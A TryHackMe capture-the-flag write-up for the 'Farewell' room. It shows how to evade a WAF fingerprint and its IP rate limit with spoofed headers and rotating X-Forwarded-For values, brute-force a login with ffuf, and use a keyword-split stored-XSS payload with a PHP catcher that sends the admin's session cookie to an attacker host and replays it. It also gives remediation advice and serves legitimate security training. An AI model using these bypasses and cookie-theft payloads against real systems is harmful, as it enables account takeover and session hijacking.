# Farewell — TryHackMe Writeup

> **Room:** [Farewell](https://tryhackme.com/room/farewell) · **Difficulty:** Hard (MAX)
> **Category:** Web / Red Teaming (WAF bypass)
> **Author of writeup:** 0xnyx
> **Goal:** Beat the WAF to log in as a user, then as admin, of the Farewell web app.

> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/farewell), **no flags, passwords, or cracked values are included** — only the method.

---

## How to read this writeup

Each step: **Do** → **You get** → **Why / what next**. The entire room is a fight against a **WAF (Web Application Firewall)**: first we beat its IP rate-limit, then its content filter. Two flags — one as a normal user, one as admin.

---

## Step 1 — Port scan + the cookie clue

**Do**

```bash
nmap -sVC -T4 -Pn <TARGET>
```

**You get**

```
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  Apache httpd 2.4.58 (Ubuntu)
| http-cookie-flags: PHPSESSID: httponly flag not set
|_http-title: Farewell — Login
```

**Why / what next** — Only SSH + HTTP. The key line: **`PHPSESSID` has no `HttpOnly`**, so JavaScript can read it. That flags the admin-stage attack as **XSS → cookie theft**. First, though, we need a normal-user account — start by mapping the login.

---

## Step 2 — Map the login + meet the WAF

**Do** — Read the login page's JS (`check.js`) to find the real auth endpoint.

```bash
curl -s http://<TARGET>/js/check.js
```

**You get**

```js
const res = await fetch('/auth.php', { method:'POST',
  headers:{ 'Content-Type':'application/x-www-form-urlencoded' },
  body: form.toString() });              // username + password
if (data.user && data.user.password_hint) { showHint(...); }
```

**Why / what next** — Two gifts: creds POST to `/auth.php`, and on a **failed** login the server **still returns the target user object, including a `password_hint`**. That's a built-in username-enumeration + hint oracle. But if we hit `/auth.php` with plain curl:

**Do**

```bash
curl -s -X POST http://<TARGET>/auth.php -d 'username=x&password=y'
```

**You get**

```
403 — WAF is Active
```

**Why / what next** — The WAF blocks non-browser traffic. It's fingerprinting us as a script. We need to look like a real browser.

---

## Step 3 — Look like a browser (beat the fingerprint)

**Do** — Add browser-like headers to every request.

```bash
curl -s -X POST http://<TARGET>/auth.php \
  -H "User-Agent: Mozilla/5.0" \
  -H "Referer: http://<TARGET>/" \
  -H "Origin: http://<TARGET>" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=<USER>&password=x'
```

**You get** — A real JSON response now, including the user object with its `password_hint`.

**Why / what next** — We can talk to the API. But to brute-force anything we'll fire many requests — and the WAF also **rate-limits by IP** (~9 requests per window). Hit that wall next.

---

## Step 4 — Beat the rate limit (X-Forwarded-For rotation)

**Do** — The app trusts the client IP from the `X-Forwarded-For` header. Rotate it per request and the WAF thinks each request is a different client.

```bash
-H "X-Forwarded-For: 203.0.$RANDOM.$RANDOM"
```

**You get** — Requests stop getting rate-limited no matter how many you send.

**Why / what next** — With both WAF defences (fingerprint + rate limit) handled, we can now brute-force a user whose hint makes their password space small.

---

## Step 5 — Flag 1: targeted brute force

**Do** — Valid usernames leak in the homepage ticker ("<user> posted a message…"). Query each through the hint oracle; one user's hint points to a tiny, well-defined password space — a known city name + 4 digits (~10,000 candidates). Brute-force that with `ffuf`, rotating the IP so the WAF never fires:

```bash
# candidate passwords (city + 4 digits) and a list of random IPs, paired 1:1 (pitchfork)
seq -w 0 9999 | sed 's/^/<CITY>/' > pw.txt
seq 1 10000 | awk '{print "13."int(rand()*254)+1"."int(rand()*254)+1"."int(rand()*254)+1}' > ips.txt

ffuf -w pw.txt:PASS -w ips.txt:IP -mode pitchfork \
  -u http://<TARGET>/auth.php -X POST \
  -H "User-Agent: Mozilla/5.0" -H "Referer: http://<TARGET>/" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: IP" \
  -d "username=<USER>&password=PASS" \
  -fr "auth_failed" -t 30
```

**You get** — The one request whose response does **not** contain `auth_failed` reveals the password. Logging in returns `{"success":true,"redirect":"/dashboard.php"}`, and the dashboard shows the **user flag**.

**Why / what next** — We're a normal user. The admin flag needs a different trick: the dashboard lets us post a "farewell message", and the story says the **admin reviews every submission**. That's a stored-XSS channel into the admin's browser — but the WAF also filters XSS.

---

## Step 6 — Flag 2: WAF-bypass stored XSS

**Do** — Probe which payloads the WAF blocks vs allows:

| Payload | Result |
|---------|--------|
| normal text | allowed |
| `<script>…</script>` | blocked |
| `<ScRiPt>…` (case) | blocked |
| `<img src=x onerror=…>` | blocked |
| `<svg onload=…>` | blocked |
| **`<body onload=…>`** | **allowed** |
| `fetch` (keyword) | blocked |
| `document.cookie` (keyword) | blocked |

**You get** — `<body onload>` slips past the tag filter, but the words `fetch` and `document.cookie` are blocked. Defeat the keyword filter with **string concatenation** so the raw words never appear:

```html
<body onload=window["fe"+"tch"]("http://<ATTACKER>:8000/?c="+document["coo"+"kie"])>
```

**Why / what next** — This payload passes the WAF *and* steals the cookie when the admin views it. Because sessions rotate fast, use a catcher that **immediately re-uses** the stolen admin cookie to pull `/admin.php` before it expires.

**Do** — Catcher that auto-uses the cookie:

```php
<?php
$qs = $_SERVER['QUERY_STRING'] ?? '';
if ($qs) {
    $sess = trim(str_replace("PHPSESSID=","",urldecode(preg_replace('/^c=/','',$qs))));
    $ctx = stream_context_create(['http'=>['header'=>
        "Cookie: PHPSESSID=$sess\r\nUser-Agent: Mozilla/5.0\r\nX-Forwarded-For: 13.9.9.9\r\n"]]);
    $r = @file_get_contents("http://<TARGET>/admin.php", false, $ctx);
    if (preg_match('/THM\{[^}]*\}/', $r, $m)) fwrite(STDERR, "\n[+] admin page captured\n");
}
echo "ok";
```

```bash
php -S 0.0.0.0:8000 catcher.php
```

**Do** — Submit the payload as your farewell message (as the normal user):

```bash
curl -s -b cookies.txt \
  -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 13.5.5.5" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -X POST http://<TARGET>/dashboard.php \
  --data-urlencode 'farewell_message=<body onload=window["fe"+"tch"]("http://<ATTACKER>:8000/?c="+document["coo"+"kie"])>'
```

**You get** — When the admin reviews messages, the XSS fires in their browser, the catcher receives the admin `PHPSESSID`, re-requests `/admin.php`, and captures the **admin flag**.

**Why / what next** — Both flags recovered. Room complete.

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | nmap | `HttpOnly` off → XSS viable |
| 2 | Read check.js | `/auth.php` + password-hint oracle |
| 3 | Browser headers | Beat WAF fingerprint |
| 4 | X-Forwarded-For rotation | Beat WAF rate limit |
| 5 | ffuf (city + 4 digits) | User flag |
| 6 | `<body onload>` + keyword-split XSS | Admin flag |

## Lessons

- **`X-Forwarded-For` rotation** defeats an IP-based WAF rate limit when the app trusts that header.
- A login that returns a **password hint** is a username-enumeration oracle — pick targeted, crackable users instead of blind rockyou.
- **WAF content-filter bypass:** swap a blocked tag for an allowed one (`<body onload>` vs `<script>`/`<img onerror>`), and split blocked keywords with string concat (`window["fe"+"tch"]`, `document["coo"+"kie"]`).
- **Stored XSS + admin bot + `HttpOnly` off** = session theft; auto-using the cookie beats fast-rotating sessions.

## Remediation

- Don't trust `X-Forwarded-For` for rate limiting; key on the real connection IP.
- Never return password hints or distinguish valid/invalid usernames in auth responses.
- Rate-limit and lock accounts on repeated failures.
- Output-encode user content; use a strict CSP; set `HttpOnly` + `Secure` on session cookies.
- A WAF is defense-in-depth, not a substitute for proper encoding and parameterization.

---

*Write-up for [TryHackMe — Farewell](https://tryhackme.com/room/farewell).*
